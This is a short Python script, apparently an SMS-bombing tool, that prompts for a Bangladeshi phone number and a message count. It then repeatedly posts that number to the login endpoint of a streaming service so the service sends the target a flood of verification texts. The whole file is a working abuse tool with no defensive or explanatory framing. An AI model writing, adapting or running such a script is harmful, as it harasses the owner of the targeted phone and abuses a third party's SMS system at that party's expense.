import requests




url = 'https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en'

nmbr = str(input(" ★ Enter Number (01XXX): "))


amn = int(input(" ★ Enter Amount Of SMS: "))

value = {"number":"+88"+nmbr}


for i in range(amn):
    requests.post(url, data=value)
    print(str(i+1)+" SMS SEND SUCCESSFULLY (°-°) DV: HOX**R - TALHA")